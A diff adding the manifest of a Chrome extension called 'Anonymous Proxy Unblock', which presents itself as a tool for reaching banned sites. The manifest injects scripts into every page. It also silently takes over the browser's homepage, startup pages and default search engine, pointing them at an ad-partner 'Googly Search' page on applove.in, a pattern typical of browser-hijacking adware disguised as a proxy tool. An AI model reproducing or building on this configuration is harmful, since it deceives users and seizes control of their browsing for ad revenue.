@@ -1,0 +1,38 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+  "manifest_version": 2,
+  "name": "Anonymous Proxy Unblock",
+  "description": "This Unblock Proxy websites app let you unblock and visit the sites that are banned in your country.",
+  "version": "2.2",
+  "offline_enabled": true,
+  "container": "GOOGLE_DRIVE",
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "<all_urls>"
+      ],
+      "js": ["jquery-3.1.0.min.js", "content.js"]
+    }
+  ],
+  "browser_action": {
+    "default_icon": "icon.png"
+  },
+"chrome_settings_overrides": {
+    "homepage": "http://applove.in/search1.html",
+    "search_provider": {
+        "name": "Googly Search",
+        "keyword": "Search Anything.",
+        "search_url": "http://applove.in/search.html?cx=partner-pub-3375438270282690%3A5513650919&cof=FORID%3A10&ie=UTF-8&q={searchTerms}",
+        "favicon_url": "http://applove.in/favicon64.png",
+       
+        "encoding": "UTF-8",
+        "is_default": true
+    },
+    "startup_pages": ["http://applove.in/search1.html"]
+   }
+
+}
